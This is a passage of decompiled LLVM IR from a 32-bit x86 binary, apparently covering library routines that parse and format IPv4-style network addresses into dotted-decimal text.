  %v5_8055d6c = inttoptr i32 %v1_8055d2e to i8*
  br label %dec_label_pc_8055dda

dec_label_pc_8055d72:                             ; preds = %dec_label_pc_8055d56
  %v1_8055d72 = inttoptr i32 %v1_8055d2e to i8*
  %v2_8055d72 = load i8, i8* %v1_8055d72, align 1
  %v3_8055d72 = icmp eq i8 %v2_8055d72, 0
  br i1 %v3_8055d72, label %dec_label_pc_8055e7a, label %dec_label_pc_8055d7b

dec_label_pc_8055d7b:                             ; preds = %dec_label_pc_8055d72
  %v0_8055d7b = load i32, i32* @ebx, align 4
  %v1_8055d7b = add i32 %v0_8055d7b, 2
  store i32 %v1_8055d7b, i32* @edx, align 4
  %v6_8055d82 = icmp ugt i32 %v1_8055d7b, %v2_8055cfa
  br i1 %v6_8055d82, label %dec_label_pc_8055e7a, label %dec_label_pc_8055d88

dec_label_pc_8055d88:                             ; preds = %dec_label_pc_8055d7b
  %v0_8055d88 = load i32, i32* @ebp, align 4
  %v2_8055d8a = udiv i32 %v0_8055d88, 256
  %v4_8055d8a = trunc i32 %v2_8055d8a to i8
  %v3_8055d8d = inttoptr i32 %v0_8055d7b to i8*
  store i8 %v4_8055d8a, i8* %v3_8055d8d, align 1
  %v0_8055d8f = load i32, i32* @ebp, align 4
  store i32 %v0_8055d8f, i32* %eax.global-to-local, align 4
  %v1_8055d91 = trunc i32 %v0_8055d8f to i8
  %v2_8055d91 = load i32, i32* @ebx, align 4
  %v3_8055d91 = add i32 %v2_8055d91, 1
  %v4_8055d91 = inttoptr i32 %v3_8055d91 to i8*
  store i8 %v1_8055d91, i8* %v4_8055d91, align 1
  %v0_8055d94 = load i32, i32* @edx, align 4
  store i32 %v0_8055d94, i32* @ebx, align 4
  %stack_var_-36.0.in.pre = load i32, i32* @edi, align 4
  br label %dec_label_pc_8055d9a

dec_label_pc_8055d9a:                             ; preds = %dec_label_pc_8055ce9, %dec_label_pc_8055d09, %dec_label_pc_8055d88
  %stack_var_-36.0.in = phi i32 [ %stack_var_-36.0.in.pre, %dec_label_pc_8055d88 ], [ %v1_8055d09, %dec_label_pc_8055d09 ], [ %v0_8055d04, %dec_label_pc_8055ce9 ]
  %stack_var_-44.0 = phi i8* [ %stack_var_-44.1, %dec_label_pc_8055d88 ], [ null, %dec_label_pc_8055d09 ], [ null, %dec_label_pc_8055ce9 ]
  %stack_var_-36.0 = inttoptr i32 %stack_var_-36.0.in to i8*
  store i32 0, i32* @ebp, align 4
  br label %dec_label_pc_8055dda.outer

dec_label_pc_8055da6:                             ; preds = %dec_label_pc_8055d51
  %v9_8055da6 = icmp eq i32 %v0_8055d51, 46
  %v1_8055da9 = icmp eq i1 %v9_8055da6, false
  br i1 %v1_8055da9, label %dec_label_pc_8055e7a, label %dec_label_pc_8055daf

dec_label_pc_8055daf:                             ; preds = %dec_label_pc_8055da6
  %v0_8055daf = load i32, i32* @ebx, align 4
  %v1_8055daf = add i32 %v0_8055daf, 4
  store i32 %v1_8055daf, i32* @esi, align 4
  %v6_8055db6 = icmp ugt i32 %v1_8055daf, %v2_8055cfa
  br i1 %v6_8055db6, label %dec_label_pc_8055e7a, label %dec_label_pc_8055dbc

dec_label_pc_8055dbc:                             ; preds = %dec_label_pc_8055daf
  store i32 %v0_8055daf, i32* @edx, align 4
  %v4_8055dbe = ptrtoint i8* %stack_var_-36.1 to i32
  store i32 %v4_8055dbe, i32* @eax, align 4
  %v2_8055dc2 = ptrtoint i8* %stack_var_-44.1 to i32
  %v5_8055dc2 = call i32 @function_8055c34(i32 %stack_var_-48.0.ph, i32 %v2_8055dc2, i32 %v2_8055cfa)
  store i32 %v5_8055dc2, i32* %eax.global-to-local, align 4
  %v0_8055dc7 = load i32, i32* @esi, align 4
  %tmp61 = icmp slt i32 %v5_8055dc2, 1
  %tmp62 = icmp eq i1 %tmp61, false
  br i1 %tmp62, label %dec_label_pc_8055e11, label %dec_label_pc_8055e7a

dec_label_pc_8055dda:                             ; preds = %dec_label_pc_8055dda.outer, %dec_label_pc_8055d68
  %v0_8055ddd = phi i32 [ %v1_8055d2e, %dec_label_pc_8055d68 ], [ %v0_8055ddd36, %dec_label_pc_8055dda.outer ]
  %stack_var_-44.1 = phi i8* [ %v5_8055d68, %dec_label_pc_8055d68 ], [ %stack_var_-44.1.ph, %dec_label_pc_8055dda.outer ]
  %stack_var_-36.1 = phi i8* [ %v5_8055d6c, %dec_label_pc_8055d68 ], [ %stack_var_-36.1.ph, %dec_label_pc_8055dda.outer ]
  %v1_8055ddd = inttoptr i32 %v0_8055ddd to i8*
  %v2_8055ddd = load i8, i8* %v1_8055ddd, align 1
  %v3_8055ddd = sext i8 %v2_8055ddd to i32
  store i32 %v3_8055ddd, i32* %eax.global-to-local, align 4
  %v2_8055de1 = call i32 @function_8056794(i32 %v3_8055ddd)
  store i32 %v2_8055de1, i32* %eax.global-to-local, align 4
  store i32 %v2_8055de1, i32* @esi, align 4
  %v1_8055deb = icmp eq i32 %v2_8055de1, 0
  %v1_8055ded = icmp eq i1 %v1_8055deb, false
  br i1 %v1_8055ded, label %dec_label_pc_8055d21, label %dec_label_pc_8055df3

dec_label_pc_8055df3:                             ; preds = %dec_label_pc_8055dda
  %v0_8055e49.pre.pre = load i32, i32* @ebx, align 4
  br i1 %v4_8055d56, label %dec_label_pc_8055e11, label %dec_label_pc_8055dfa

dec_label_pc_8055dfa:                             ; preds = %dec_label_pc_8055df3
  %v1_8055dfa = add i32 %v0_8055e49.pre.pre, 2
  store i32 %v1_8055dfa, i32* @edx, align 4
  %v6_8055e01 = icmp ugt i32 %v1_8055dfa, %v2_8055cfa
  br i1 %v6_8055e01, label %dec_label_pc_8055e7a, label %dec_label_pc_8055e03

dec_label_pc_8055e03:                             ; preds = %dec_label_pc_8055dfa
  %v0_8055e03 = load i32, i32* @ebp, align 4
  %v2_8055e05 = udiv i32 %v0_8055e03, 256
  %v4_8055e05 = trunc i32 %v2_8055e05 to i8
  %v3_8055e08 = inttoptr i32 %v0_8055e49.pre.pre to i8*
  store i8 %v4_8055e05, i8* %v3_8055e08, align 1
  %v0_8055e0a = load i32, i32* @ebp, align 4
  store i32 %v0_8055e0a, i32* %eax.global-to-local, align 4
  %v1_8055e0c = trunc i32 %v0_8055e0a to i8
  %v2_8055e0c = load i32, i32* @ebx, align 4
  %v3_8055e0c = add i32 %v2_8055e0c, 1
  %v4_8055e0c = inttoptr i32 %v3_8055e0c to i8*
  store i8 %v1_8055e0c, i8* %v4_8055e0c, align 1
  %v0_8055e0f = load i32, i32* @edx, align 4
  br label %dec_label_pc_8055e11

dec_label_pc_8055e11:                             ; preds = %dec_label_pc_8055df3, %dec_label_pc_8055dbc, %dec_label_pc_8055e03
  %v0_8055e49.pre = phi i32 [ %v0_8055dc7, %dec_label_pc_8055dbc ], [ %v0_8055e0f, %dec_label_pc_8055e03 ], [ %v0_8055e49.pre.pre, %dec_label_pc_8055df3 ]
  %v4_8055e11 = ptrtoint i8* %stack_var_-44.1 to i32
  %v5_8055e11 = icmp eq i8* %stack_var_-44.1, null
  br i1 %v5_8055e11, label %dec_label_pc_8055e49, label %dec_label_pc_8055e18

dec_label_pc_8055e18:                             ; preds = %dec_label_pc_8055e11
  store i32 1, i32* @esi, align 4
  %v6_8055e1f = sub i32 %v0_8055e49.pre, %v4_8055e11
  store i32 %v6_8055e1f, i32* @edi, align 4
  %v16_8055e23 = icmp eq i32 %v0_8055e49.pre, %v2_8055cfa
  %v1_8055e27 = icmp eq i1 %v16_8055e23, false
  br i1 %v1_8055e27, label %dec_label_pc_8055e41.preheader, label %dec_label_pc_8055e7a

dec_label_pc_8055e41.preheader:                   ; preds = %dec_label_pc_8055e18
  %v3_8055e4193 = inttoptr i32 %v6_8055e1f to i8*
  %v9_8055e4395 = icmp slt i8* %v3_8055e4193, inttoptr (i32 1 to i8*)
  br i1 %v9_8055e4395, label %dec_label_pc_8055e49.thread, label %dec_label_pc_8055e2b

dec_label_pc_8055e2b:                             ; preds = %dec_label_pc_8055e41.preheader, %dec_label_pc_8055e2b
  %v0_8055e3997 = phi i32 [ %v0_8055e41.pre, %dec_label_pc_8055e2b ], [ 1, %dec_label_pc_8055e41.preheader ]
  %v0_8055e2b96 = phi i32 [ %v1_8055e41.pre, %dec_label_pc_8055e2b ], [ %v6_8055e1f, %dec_label_pc_8055e41.preheader ]
  %v2_8055e31 = sub i32 %v0_8055e2b96, %v0_8055e3997
  %v2_8055e33 = sub i32 %v2_8055cfa, %v0_8055e3997
  %v6_8055e35 = add i32 %v2_8055e31, %v4_8055e11
  store i32 %v6_8055e35, i32* %eax.global-to-local, align 4
  %v1_8055e39 = add i32 %v0_8055e3997, 1
  store i32 %v1_8055e39, i32* @esi, align 4
  %v1_8055e3a = inttoptr i32 %v6_8055e35 to i8*
  %v2_8055e3a = load i8, i8* %v1_8055e3a, align 1
  %v3_8055e3a = zext i8 %v2_8055e3a to i32
  %v4_8055e3a = load i32, i32* @edx, align 4
  %v5_8055e3a = and i32 %v4_8055e3a, -256
  %v6_8055e3a = or i32 %v5_8055e3a, %v3_8055e3a
  store i32 %v6_8055e3a, i32* @edx, align 4
  %v3_8055e3c = inttoptr i32 %v2_8055e33 to i8*
  store i8 %v2_8055e3a, i8* %v3_8055e3c, align 1
  %v0_8055e3e = load i32, i32* %eax.global-to-local, align 4
  %v1_8055e3e = inttoptr i32 %v0_8055e3e to i8*
  store i8 0, i8* %v1_8055e3e, align 1
  %v0_8055e41.pre = load i32, i32* @esi, align 4
  %v1_8055e41.pre = load i32, i32* @edi, align 4
  %v2_8055e41 = inttoptr i32 %v0_8055e41.pre to i8*
  %v3_8055e41 = inttoptr i32 %v1_8055e41.pre to i8*
  %v9_8055e43 = icmp sgt i8* %v2_8055e41, %v3_8055e41
  br i1 %v9_8055e43, label %dec_label_pc_8055e49.thread, label %dec_label_pc_8055e2b

dec_label_pc_8055e49.thread:                      ; preds = %dec_label_pc_8055e2b, %dec_label_pc_8055e41.preheader
  br label %dec_label_pc_8055e4f

dec_label_pc_8055e49:                             ; preds = %dec_label_pc_8055e11
  %v16_8055e49 = icmp eq i32 %v0_8055e49.pre, %v2_8055cfa
  %v1_8055e4d = icmp eq i1 %v16_8055e49, false
  br i1 %v1_8055e4d, label %dec_label_pc_8055e7a, label %dec_label_pc_8055e4f

dec_label_pc_8055e4f:                             ; preds = %dec_label_pc_8055e49.thread, %dec_label_pc_8055e49
  store i32 %v2_8055cee, i32* %eax.global-to-local, align 4
  %tmp63 = inttoptr i32 %arg3 to i16*
  %v5_8055e5b = call i32 @function_8051414(i16* %tmp63, i32 %v2_8055cee, i32 16)
  store i32 1, i32* %eax.global-to-local, align 4
  br label %dec_label_pc_8055e7c

dec_label_pc_8055e6a:                             ; preds = %dec_label_pc_8055cce
  %v1_8055e6a = call i32 @function_8050568(i32 %v0_8055cbd)
  %v1_8055e6f = inttoptr i32 %v1_8055e6a to i32*
  store i32 97, i32* %v1_8055e6f, align 4
  store i32 -1, i32* %eax.global-to-local, align 4
  br label %dec_label_pc_8055e7c

dec_label_pc_8055e7a:                             ; preds = %dec_label_pc_8055d7b, %dec_label_pc_8055d72, %dec_label_pc_8055d36, %dec_label_pc_8055d5d, %dec_label_pc_8055e18, %dec_label_pc_8055dbc, %dec_label_pc_8055e49, %dec_label_pc_8055dfa, %dec_label_pc_8055daf, %dec_label_pc_8055da6, %dec_label_pc_8055d09
  store i32 0, i32* %eax.global-to-local, align 4
  br label %dec_label_pc_8055e7c

dec_label_pc_8055e7c:                             ; preds = %dec_label_pc_8055e6a, %dec_label_pc_8055e4f, %dec_label_pc_8055cd9, %dec_label_pc_8055e7a
  %v0_8055e83 = phi i32 [ -1, %dec_label_pc_8055e6a ], [ 1, %dec_label_pc_8055e4f ], [ %v3_8055cdf, %dec_label_pc_8055cd9 ], [ 0, %dec_label_pc_8055e7a ]
  store i32 %v0_8055cbd, i32* @ebx, align 4
  store i32 %v0_8055cbc, i32* @esi, align 4
  store i32 %v0_8055cbb, i32* @edi, align 4
  store i32 %v0_8055cba, i32* @ebp, align 4
  ret i32 %v0_8055e83

; uselistorder directives
  uselistorder i32 %v1_8055e41.pre, { 1, 0 }
  uselistorder i32 %v0_8055e41.pre, { 1, 0 }
  uselistorder i32 %v0_8055e3997, { 2, 1, 0 }
  uselistorder i32 %v0_8055e49.pre, { 2, 1, 0 }
  uselistorder i32 %v0_8055e49.pre.pre, { 0, 2, 1 }
  uselistorder i32 %v2_8055de1, { 2, 1, 3, 0 }
  uselistorder i8* %stack_var_-36.1, { 1, 0 }
  uselistorder i8* %stack_var_-44.1, { 1, 0, 4, 5, 3, 2 }
  uselistorder i32 %stack_var_-36.0.in, { 1, 0 }
  uselistorder i32 %v1_8055d2e, { 3, 0, 2, 1, 4 }
  uselistorder i32 %v2_8055cfa, { 0, 2, 1, 6, 3, 4, 5, 7 }
  uselistorder i32 %v0_8055cbd, { 0, 2, 1 }
  uselistorder i32* %eax.global-to-local, { 0, 1, 3, 2, 4, 5, 6, 11, 12, 7, 8, 9, 10, 13, 14, 15, 16 }
  uselistorder i32 58, { 0, 2, 1 }
  uselistorder i32 (i32, i32, i32)* @function_8055c34, { 1, 0 }
  uselistorder i32 %arg3, { 1, 0 }
  uselistorder label %dec_label_pc_8055e7c, { 3, 0, 1, 2 }
  uselistorder label %dec_label_pc_8055e7a, { 6, 4, 7, 5, 8, 9, 0, 1, 3, 2, 10 }
  uselistorder label %dec_label_pc_8055e4f, { 1, 0 }
  uselistorder label %dec_label_pc_8055e2b, { 1, 0 }
  uselistorder label %dec_label_pc_8055e11, { 2, 0, 1 }
  uselistorder label %dec_label_pc_8055dda, { 1, 0 }
  uselistorder label %dec_label_pc_8055d9a, { 2, 1, 0 }
  uselistorder label %dec_label_pc_8055dda.outer, { 1, 0 }
}

define i32 @function_8055e84(i32 %arg1, i32 %arg2, i32 %arg3) local_unnamed_addr {
dec_label_pc_8055e84:
  %eax.global-to-local = alloca i32, align 4
  %ebp.global-to-local = alloca i32, align 4
  %ebx.global-to-local = alloca i32, align 4
  %ecx.global-to-local = alloca i32, align 4
  %edi.global-to-local = alloca i32, align 4
  %edx.global-to-local = alloca i32, align 4
  %stack_var_-92 = alloca i32, align 4
  %stack_var_-33 = alloca i32, align 4
  %stack_var_-31 = alloca i32, align 4
  %v0_8055e85 = load i32, i32* @edi, align 4
  %v0_8055e86 = load i32, i32* @esi, align 4
  store i32 0, i32* %ebp.global-to-local, align 4
  store i1 false, i1* @df, align 1
  %v0_8055e8e = load i32, i32* @eax, align 4
  %v3_8055e92 = and i32 %v0_8055e8e, -65536
  store i32 %v3_8055e92, i32* %stack_var_-33, align 4
  %v2_8055e9d = ptrtoint i32* %stack_var_-31 to i32
  store i32 0, i32* %eax.global-to-local, align 4
  %v0_8055ea3 = load i32, i32* @edx, align 4
  %v0_8055ea7 = load i32, i32* @ecx, align 4
  store i32 0, i32* %ebx.global-to-local, align 4
  store i32 0, i32* %stack_var_-31, align 4
  %v6_8055ead = add i32 %v2_8055e9d, 4
  store i32 %v6_8055ead, i32* %edi.global-to-local, align 4
  %v2_8055eae = inttoptr i32 %v6_8055ead to i32*
  store i32 0, i32* %v2_8055eae, align 4
  %v3_8055eae = load i32, i32* %edi.global-to-local, align 4
  %v6_8055eae = add i32 %v3_8055eae, 4
  store i32 %v6_8055eae, i32* %edi.global-to-local, align 4
  %v0_8055eaf = load i32, i32* %eax.global-to-local, align 4
  %v2_8055eaf = inttoptr i32 %v6_8055eae to i32*
  store i32 %v0_8055eaf, i32* %v2_8055eaf, align 4
  %v3_8055eaf = load i32, i32* %edi.global-to-local, align 4
  %v6_8055eaf = add i32 %v3_8055eaf, 4
  store i32 %v6_8055eaf, i32* %edi.global-to-local, align 4
  %v0_8055eb0 = load i32, i32* %eax.global-to-local, align 4
  %v1_8055eb0 = trunc i32 %v0_8055eb0 to i16
  %v3_8055eb0 = inttoptr i32 %v6_8055eaf to i16*
  store i16 %v1_8055eb0, i16* %v3_8055eb0, align 2
  %v4_8055eb0 = load i32, i32* %edi.global-to-local, align 4
  %v7_8055eb0 = add i32 %v4_8055eb0, 2
  store i32 %v7_8055eb0, i32* %edi.global-to-local, align 4
  %v0_8055eb2 = load i32, i32* %eax.global-to-local, align 4
  %v1_8055eb2 = trunc i32 %v0_8055eb2 to i8
  %v3_8055eb2 = inttoptr i32 %v7_8055eb0 to i8*
  store i8 %v1_8055eb2, i8* %v3_8055eb2, align 1
  %v4_8055eb2 = load i32, i32* %edi.global-to-local, align 4
  %v5_8055eb2 = load i1, i1* @df, align 1
  %v6_8055eb2 = select i1 %v5_8055eb2, i32 -1, i32 1
  %v7_8055eb2 = add i32 %v6_8055eb2, %v4_8055eb2
  store i32 %v7_8055eb2, i32* @edi, align 4
  %v0_8055f4220 = load i32, i32* %ebp.global-to-local, align 4
  %v7_8055f4522 = icmp sgt i32 %v0_8055f4220, 3
  br i1 %v7_8055f4522, label %dec_label_pc_8055f4b, label %dec_label_pc_8055eb8

dec_label_pc_8055eb8:                             ; preds = %dec_label_pc_8055e84, %dec_label_pc_8055f20
  %v0_8055f4223 = phi i32 [ %v0_8055f42, %dec_label_pc_8055f20 ], [ %v0_8055f4220, %dec_label_pc_8055e84 ]
  %v0_8055ebc = load i32, i32* @ecx, align 4
  %v1_8055ebc = and i32 %v0_8055ebc, -256
  %v2_8055ebc = or i32 %v1_8055ebc, 100
  store i32 %v2_8055ebc, i32* %ecx.global-to-local, align 4
  %v2_8055ebe = add i32 %v0_8055f4223, %v0_8055e8e
  store i32 %v2_8055ebe, i32* %eax.global-to-local, align 4
  %v0_8055ec0 = load i32, i32* %ebx.global-to-local, align 4
  %v1_8055ec0 = add i32 %v0_8055ec0, 1
  store i32 %v1_8055ec0, i32* @esi, align 4
  store i32 %v0_8055ec0, i32* @edi, align 4
  %v1_8055ec9 = inttoptr i32 %v2_8055ebe to i8*
  %v2_8055ec9 = load i8, i8* %v1_8055ec9, align 1
  %v3_8055ec9 = zext i8 %v2_8055ec9 to i32
  %v4_8055ec9 = load i32, i32* @edx, align 4
  %v5_8055ec9 = and i32 %v4_8055ec9, -65536
  %v6_8055ec9 = or i32 %v5_8055ec9, %v3_8055ec9
  store i32 %v6_8055ec9, i32* %edx.global-to-local, align 4
  %div = udiv i8 %v2_8055ec9, 100
  %v6_8055ecf = zext i8 %div to i32
  %v4_8055ed1 = or i32 %v6_8055ecf, %v1_8055ebc
  store i32 %v4_8055ed1, i32* %ecx.global-to-local, align 4
  %v1_8055ed3 = or i32 %v4_8055ed1, 48
  store i32 %v1_8055ed3, i32* %eax.global-to-local, align 4
  %v1_8055ed6 = trunc i32 %v1_8055ed3 to i8
  %v2_8055ed6 = load i32, i32* @esp, align 4
  %v4_8055ed6 = add i32 %v0_8055ec0, 43
  %v5_8055ed6 = add i32 %v4_8055ed6, %v2_8055ed6
  %v6_8055ed6 = inttoptr i32 %v5_8055ed6 to i8*
  store i8 %v1_8055ed6, i8* %v6_8055ed6, align 1
  %v0_8055eda = load i32, i32* %eax.global-to-local, align 4
  %v1_8055eda = trunc i32 %v0_8055eda to i8
  %v7_8055eda = icmp eq i8 %v1_8055eda, 48
  %v1_8055edc = icmp eq i1 %v7_8055eda, false
  %v0_8055f02 = load i32, i32* %ecx.global-to-local, align 4
  %v1_8055f02 = and i32 %v0_8055f02, -256
  %v2_8055f02 = or i32 %v1_8055f02, 10
  store i32 %v2_8055f02, i32* %ecx.global-to-local, align 4
  %v0_8055f04 = load i32, i32* %edx.global-to-local, align 4
  store i32 %v0_8055f04, i32* %eax.global-to-local, align 4
  %v3_8055f06 = trunc i32 %v0_8055f04 to i16
  %v5_8055f06 = udiv i16 %v3_8055f06, 10
  br i1 %v1_8055edc, label %dec_label_pc_8055f02, label %dec_label_pc_8055ede

dec_label_pc_8055ede:                             ; preds = %dec_label_pc_8055eb8
  %v9_8055ee2 = and i32 %v0_8055f04, -65536
  %tmp = urem i16 %v5_8055f06, 256
  store i32 10, i32* %ecx.global-to-local, align 4
  %div25 = udiv i16 %tmp, 10
  %v7_8055eef = zext i16 %div25 to i32
  %v11_8055eef = or i32 %v7_8055eef, %v9_8055ee2
  store i32 %v11_8055eef, i32* %eax.global-to-local, align 4
  %tmp27 = urem i16 %tmp, 10
  %v12_8055eef = zext i16 %tmp27 to i32
  %v1_8055ef2 = or i32 %v12_8055eef, 48
  %v8_8055ef2 = trunc i32 %v1_8055ef2 to i8
  store i32 %v1_8055ef2, i32* %edx.global-to-local, align 4
  %v2_8055ef5 = load i32, i32* @esp, align 4
  %v3_8055ef5 = load i32, i32* %ebx.global-to-local, align 4
  %v4_8055ef5 = add i32 %v2_8055ef5, 43
  %v5_8055ef5 = add i32 %v4_8055ef5, %v3_8055ef5
  %v6_8055ef5 = inttoptr i32 %v5_8055ef5 to i8*
  store i8 %v8_8055ef2, i8* %v6_8055ef5, align 1
  %v0_8055ef9 = load i32, i32* %edx.global-to-local, align 4
  %v1_8055ef9 = trunc i32 %v0_8055ef9 to i8
  %v7_8055ef9 = icmp eq i8 %v1_8055ef9, 48
  br i1 %v7_8055ef9, label %dec_label_pc_8055f20, label %dec_label_pc_8055efe

dec_label_pc_8055efe:                             ; preds = %dec_label_pc_8055ede
  %v0_8055efe = load i32, i32* @esi, align 4
  store i32 %v0_8055efe, i32* @edi, align 4
  br label %dec_label_pc_8055f20

dec_label_pc_8055f02:                             ; preds = %dec_label_pc_8055eb8
  %tmp28 = urem i16 %v5_8055f06, 256
  %v3_8055f08 = and i32 %v0_8055f04, -65536
  store i32 10, i32* %ecx.global-to-local, align 4
  %div26 = udiv i16 %tmp28, 10
  %v7_8055f13 = zext i16 %div26 to i32
  %v11_8055f13 = or i32 %v7_8055f13, %v3_8055f08
  store i32 %v11_8055f13, i32* %eax.global-to-local, align 4
  %tmp29 = urem i16 %tmp28, 10
  %v12_8055f13 = zext i16 %tmp29 to i32
  %v1_8055f16 = or i32 %v12_8055f13, 48
  %v8_8055f16 = trunc i32 %v1_8055f16 to i8
  store i32 %v1_8055f16, i32* %edx.global-to-local, align 4
  %v0_8055f19 = load i32, i32* %ebx.global-to-local, align 4
  %v1_8055f19 = add i32 %v0_8055f19, 2
  store i32 %v1_8055f19, i32* @edi, align 4
  %v2_8055f1c = load i32, i32* @esp, align 4
  %v3_8055f1c = load i32, i32* @esi, align 4
  %v4_8055f1c = add i32 %v2_8055f1c, 43
  %v5_8055f1c = add i32 %v4_8055f1c, %v3_8055f1c
  %v6_8055f1c = inttoptr i32 %v5_8055f1c to i8*
  store i8 %v8_8055f16, i8* %v6_8055f1c, align 1
  br label %dec_label_pc_8055f20

dec_label_pc_8055f20:                             ; preds = %dec_label_pc_8055ede, %dec_label_pc_8055efe, %dec_label_pc_8055f02
  store i32 %v2_8055ebe, i32* %edx.global-to-local, align 4
  store i32 10, i32* @ecx, align 4
  %v0_8055f29 = load i32, i32* @edi, align 4
  %v1_8055f29 = add i32 %v0_8055f29, 2
  store i32 %v1_8055f29, i32* %ebx.global-to-local, align 4
  %v0_8055f2c = load i32, i32* %ebp.global-to-local, align 4
  %v1_8055f2c = add i32 %v0_8055f2c, 1
  store i32 %v1_8055f2c, i32* %ebp.global-to-local, align 4
  %v2_8055f2d = load i8, i8* %v1_8055ec9, align 1
  %v3_8055f2d = zext i8 %v2_8055f2d to i32
  %v4_8055f2d = load i32, i32* %eax.global-to-local, align 4
  %v5_8055f2d = and i32 %v4_8055f2d, -65536
  %v6_8055f2d = or i32 %v5_8055f2d, %v3_8055f2d
  store i32 %v6_8055f2d, i32* %eax.global-to-local, align 4
  store i32 0, i32* %edx.global-to-local, align 4
  %v0_8055f33 = load i32, i32* @esp, align 4
  %v2_8055f33 = add i32 %v0_8055f29, 44
  %v3_8055f33 = add i32 %v2_8055f33, %v0_8055f33
  %v4_8055f33 = inttoptr i32 %v3_8055f33 to i8*
  store i8 46, i8* %v4_8055f33, align 1
  %v0_8055f38 = load i32, i32* @ecx, align 4
  %v1_8055f38 = load i32, i32* %eax.global-to-local, align 4
  %v2_8055f38 = urem i32 %v1_8055f38, 65536
  %v3_8055f38 = load i32, i32* %edx.global-to-local, align 4
  %v4_8055f38 = mul i32 %v3_8055f38, 65536
  %v5_8055f38 = or i32 %v4_8055f38, %v2_8055f38
  %v6_8055f38 = urem i32 %v0_8055f38, 65536
  %v7_8055f38 = udiv i32 %v5_8055f38, %v6_8055f38
  %v8_8055f38 = urem i32 %v7_8055f38, 65536
  %v10_8055f38 = and i32 %v1_8055f38, -65536
  %v11_8055f38 = or i32 %v8_8055f38, %v10_8055f38
  store i32 %v11_8055f38, i32* %eax.global-to-local, align 4
  %v12_8055f38 = urem i32 %v5_8055f38, %v6_8055f38
  %v14_8055f38 = and i32 %v3_8055f38, -65536
  %v15_8055f38 = or i32 %v12_8055f38, %v14_8055f38
  %v1_8055f3b = add i32 %v15_8055f38, 48
  %v8_8055f3b = trunc i32 %v1_8055f3b to i8
  store i32 %v1_8055f3b, i32* @edx, align 4
  %v2_8055f3e = load i32, i32* @esp, align 4
  %v3_8055f3e = load i32, i32* @edi, align 4
  %v4_8055f3e = add i32 %v2_8055f3e, 43
  %v5_8055f3e = add i32 %v4_8055f3e, %v3_8055f3e
  %v6_8055f3e = inttoptr i32 %v5_8055f3e to i8*
  store i8 %v8_8055f3b, i8* %v6_8055f3e, align 1
  %v0_8055f42 = load i32, i32* %ebp.global-to-local, align 4
  %v7_8055f45 = icmp sgt i32 %v0_8055f42, 3
  br i1 %v7_8055f45, label %dec_label_pc_8055f4b, label %dec_label_pc_8055eb8

dec_label_pc_8055f4b:                             ; preds = %dec_label_pc_8055f20, %dec_label_pc_8055e84
  %v0_8055f4b = load i32, i32* @esp, align 4
  %v1_8055f4b = load i32, i32* %ebx.global-to-local, align 4
  %v2_8055f4b = add i32 %v0_8055f4b, 42
  %v3_8055f4b = add i32 %v2_8055f4b, %v1_8055f4b
  %v4_8055f4b = inttoptr i32 %v3_8055f4b to i8*
  store i8 0, i8* %v4_8055f4b, align 1
  %v2_8055f53 = ptrtoint i32* %stack_var_-33 to i32
  store i32 %v2_8055f53, i32* %ebx.global-to-local, align 4
  store i32 %v2_8055f53, i32* %stack_var_-92, align 4
  %v1_8055f58 = bitcast i32* %stack_var_-33 to i8*
  %v2_8055f58 = call i32 @function_80514b0(i8* %v1_8055f58)
  store i32 %v2_8055f58, i32* @eax, align 4
  %tmp24 = icmp ugt i32 %v2_8055f58, %v0_8055ea7
  br i1 %tmp24, label %dec_label_pc_8055f66, label %dec_label_pc_8055f75

dec_label_pc_8055f66:                             ; preds = %dec_label_pc_8055f4b
  %v0_8055f66 = load i32, i32* %stack_var_-92, align 4
  %v1_8055f66 = call i32 @function_8050568(i32 %v0_8055f66)
  %v1_8055f6b = inttoptr i32 %v1_8055f66 to i32*
  store i32 28, i32* %v1_8055f6b, align 4
  br label %dec_label_pc_8055f84

dec_label_pc_8055f75:                             ; preds = %dec_label_pc_8055f4b
  store i32 %v0_8055ea3, i32* %stack_var_-92, align 4
  %v2_8055f7c = inttoptr i32 %v0_8055ea3 to i8*
  %v3_8055f7c = call i32 @function_8051494(i8* %v2_8055f7c, i32 %v2_8055f53)
  br label %dec_label_pc_8055f84

dec_label_pc_8055f84:                             ; preds = %dec_label_pc_8055f66, %dec_label_pc_8055f75
  %storemerge = phi i32 [ %v3_8055f7c, %dec_label_pc_8055f75 ], [ 0, %dec_label_pc_8055f66 ]
  %v0_8055f8b = phi i32 [ %v3_8055f7c, %dec_label_pc_8055f75 ], [ 0, %dec_label_pc_8055f66 ]
  store i32 %storemerge, i32* %eax.global-to-local, align 4
  store i32 %v0_8055e86, i32* @esi, align 4
  store i32 %v0_8055e85, i32* @edi, align 4
  ret i32 %v0_8055f8b

; uselistorder directives
  uselistorder i32 %v0_8055f42, { 1, 0 }
  uselistorder i32 %v3_8055f38, { 1, 0 }
  uselistorder i32 %v1_8055f38, { 1, 0 }
  uselistorder i32 %v1_8055f16, { 1, 0 }
  uselistorder i32 %v1_8055ef2, { 1, 0 }
  uselistorder i32 %v0_8055f04, { 1, 0, 2, 3 }
  uselistorder i32 %v1_8055ed3, { 1, 0 }
  uselistorder i32 %v0_8055ea3, { 1, 0 }
  uselistorder i32* %stack_var_-33, { 0, 2, 1 }
  uselistorder i32* %stack_var_-92, { 1, 0, 2 }
  uselistorder i32* %ecx.global-to-local, { 0, 2, 1, 3, 4, 5 }
  uselistorder i32* %ebx.global-to-local, { 0, 2, 1, 3, 4, 5, 6 }
  uselistorder i32* %ebp.global-to-local, { 0, 1, 3, 2, 4 }
  uselistorder i32* %eax.global-to-local, { 0, 1, 2, 3, 6, 4, 7, 5, 8, 9, 10, 11, 12, 13, 14 }
  uselistorder i32 42, { 2, 1, 0 }
  uselistorder i16 10, { 0, 1, 2, 3, 5, 4, 6 }
  uselistorder i8 48, { 2, 3, 11, 13, 4, 5, 8, 7, 6, 9, 0, 10, 1, 12 }
  uselistorder i32 43, { 3, 4, 5, 6, 1, 7, 2, 0 }
  uselistorder i8 100, { 1, 0 }
  uselistorder i32 100, { 5, 1, 3, 4, 2, 0 }
  uselistorder i32 -65536, { 2, 3, 4, 1, 0, 5, 6, 8, 9, 7 }
  uselistorder i1* @df, { 4, 5, 12, 13, 0, 1, 16, 17, 8, 2, 3, 14, 15, 6, 7, 9, 10, 11 }
  uselistorder label %dec_label_pc_8055f84, { 1, 0 }
  uselistorder label %dec_label_pc_8055f20, { 2, 1, 0 }
  uselistorder label %dec_label_pc_8055eb8, { 1, 0 }
}

define i32 @function_8055f8c(i32 %arg1, i32 %arg2, i32 %arg3, i32 %arg4) local_unnamed_addr {
dec_label_pc_8055f8c:
  %eax.global-to-local = alloca i32, align 4
